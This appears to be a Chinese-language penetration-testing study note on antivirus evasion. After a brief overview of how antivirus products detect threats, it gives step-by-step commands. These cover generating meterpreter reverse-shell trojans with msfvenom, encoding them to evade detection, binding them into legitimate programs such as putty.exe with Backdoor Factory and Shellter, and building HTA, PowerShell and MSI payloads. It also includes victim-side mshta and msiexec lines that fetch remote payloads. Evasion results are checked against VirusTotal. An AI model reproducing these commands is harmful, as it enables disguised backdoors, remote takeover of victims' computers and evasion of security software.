# 渗透测试基础18

# 免杀技术以及木马处理（免杀、免杀软件原理、安装wine32、安装pip、普通木马、msf自带免杀、msf捆绑免杀、msf自带免杀+捆绑、backdoor factory——后门工厂、用户自己做的木马、unicorn、spookflare、sharpshooter、msf创建hta程序、shellter、msi执行的木马——可以隔空执行的、shellcode-launcher）

kali、Windows、http://virustotal.com/

## 免杀

如果需要深入了解
还需要学习：破解、二进制、逆向工程



## 杀毒软件原理：

### 扫描技术：

扫描压缩包：
对压缩包内容进行分析检查

### 程序篡改防护：

避免感染文件

### 修复技术：

对受损文件进行还原

### 急救盘杀毒：

利用空白的u盘制作进行杀毒

### 智能扫描：

扫描常用磁盘和系统关键位置

### 全盘扫描：

所有地方都扫描

### 勒索软件防护：

保护电脑文件不被加密

### 开机扫描：

扫描可能不需要的程序

### 监控技术：

**内存监控**：
监控内存，进程，网络数据

**文件监控**：
发现文件存在病毒或者被感染报警

**邮件监控**：
电子邮件病毒拦截

### 网页防护：

阻止网络攻击和不安全的下载

### 行为防护：

提醒用户应用程序可疑的行为





## 安装wine32 

```
dpkg --add-architecture i386 && apt update && apt -y install wine32 
```

让linux去执行一些Windows的程序



## 安装pip 

```
wget https://bootstrap.pypa.io/2.6/get-pip.py 

python2 get-pip.py 

apt-get install python3-pip 

pip install --upgrade pip -i https://pypi.douban.com/simple 

```

Python的应用商店



## 普通木马

```
msfconsole

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f exe -o shell.exe

# -p windows/meterpreter/reverse_tcp 利用windows/meterpreter/reverse_tcp 生成木马程序
# lhost=192.168.1.144 lport=4444 连接本地ip和端口
# -o shell.exe 生成名为shell.exe的木马程序

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost=192.168.1.144
show options
exploit

background
sessions
```

![image-20220112131634521](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112131634521.png)

56/71



## msf自带免杀

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o shell.exe

# x86/shikata_ga_nai 用自带免杀把软件进行加密
# 屏蔽\x00 i加密15次
# -f exe 加密同时不能破坏exe的结构
```

55/71



## msf捆绑免杀

比如：一个正经软件putty.exe+捆绑木马

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -x putty.exe -f exe -o shell.exe

# -x putty.exe 把木马程序捆绑在putty.exe上
# -f exe 加密同时不能破坏exe的结构
```

44/71



## msf自带免杀+捆绑

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o shell.exe

# 合并前两个操作
```

45/70



## backdoor factory——后门工厂

GitHub上搜索backdoor factory

【是用Python写的】

原理：把木马插入程序的代码缝隙

```
cd进入文件夹
cd the-backdoor-factory-master/
chmod 777 ./*
./install.sh
pip install -i https://pypi.douban.com/simple pefile/capstone
# 重新安装缺失组件

对某个正经程序插入木马代码：
# 查看这个程序是否支持插入代码
python backdoor.py -f /root/putty.exe -S

# 查找程序里大于600的缝隙
python backdoor.py -f /root/putty.exe -c -l 600

# 获取文件可用的payload
python backdoor.py -f /root/putty.exe -s show

# 生成payload
python backdoor.py -f /root/putty.exe -s reverse_shell_tcp_inline -H 192.168.1.144 -P 4444 -J -o haha.exe
```

26/70



## 用户自己做的木马

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.c

python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shell.c -o haha.exe

# 把木马做成.c的格式
```

48/71



## unicorn

```
cd unicorn-master/
ls
chmod 777 ./*
python unicorn.py --help

python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.144 4444

# 生成2个文件，xxx.rc文件[meterpreter监听代码]和txt文件[powershell的txt文件攻击代码](powershell的txt文件可以考虑变成bat)

msfconsole -r unicorn.rc
msfconsole -r xxx.rc
# 使用代码
```

6/59



## spookflare

GitHub上搜索

```
cd  SpookFlare-master/
ls
chmod 777 ./*
# 发现有requirements.txt就要去安装Python的依赖库

安装python依赖库
pip install -i https://pypi.douban.com/simple -r requirements.txt

python  spookflare.py     # 进入

help

list
use 1
info    #可以查看需要set的内容【类似于options】
set PROTO http
set LHOST 192.168.1.144
set LPORT 8080
set ARCH x64
set SSIZE 61337

generate    #生成
```

![image-20220112135845530](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112135845530.png)

然后需要编译然后才可以被当做木马使用

![image-20220112135948473](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112135948473.png)

10/59



## sharpshooter

云盘里可以下载

```
cd   SharpShooter-master/
ls
chmod 777 ./*
# 发现有requirements.txt就要去安装Python的依赖库

# 安装python依赖库
pip install -i https://pypi.douban.com/simple -r requirements.txt

# 生成txt格式木马
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.144 LPORT=4444 -f raw -o shellcode.txt

# 创建hta后门
python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee

# 得到hta格式和html格式

use  multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.144
set lport 4444
exploit

被植入电脑cmd：执行
mshta.exe http://192.168.1.252/foo.hta
http://192.168.1.252/foo.html
```

类似钓鱼网站执行

24/61



## msf创建hta程序

```
msfconsole
use exploit/windows/misc/hta_server
set srvhost [你自己ip]
set lhost [你自己ip]
exploit

# 会给你一个网址 http://xxxxxx/xxx.hta

#然后用户可以远程去执行：
mshta http://xxxxxx/xxx.hta
```

29/61



## shellter

```
apt-get install shellter
# 安装一下，不能在终端操作
A
PE Target: /root/putty.exe
```

![image-20220112143004964](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112143004964.png)

选择攻击载荷

![image-20220112143101892](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112143101892.png)

![image-20220112143140631](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112143140631.png)

![image-20220112143158162](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112143158162.png)

然后已经生成好改造后的putty.exe，再看putty.exe

41/71

`Eable Stealth Mode `可以no，不然效果会差一点

![image-20220112143610795](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220112143610795.png)

39/70



生成之后在msfconsole里使用:

```
handler -H 192.168.1.144 -P 4444 -p windows/meterpreter/reverse_tcp

jobs
可以看见开启监听
```



## msi执行的木马——可以隔空执行的

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f msi > haha.txt

然后在被控制电脑里：
msiexec /q /i http://192.168.1.252/haha.txt
```

35/58



## shellcode-launcher

github

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.raw
```

需要执行

24/59



免杀在实战中很重要，不过最好得学会编程，不然没办法自己研发出自己的木马，用人家的东西效果一般不太友好。
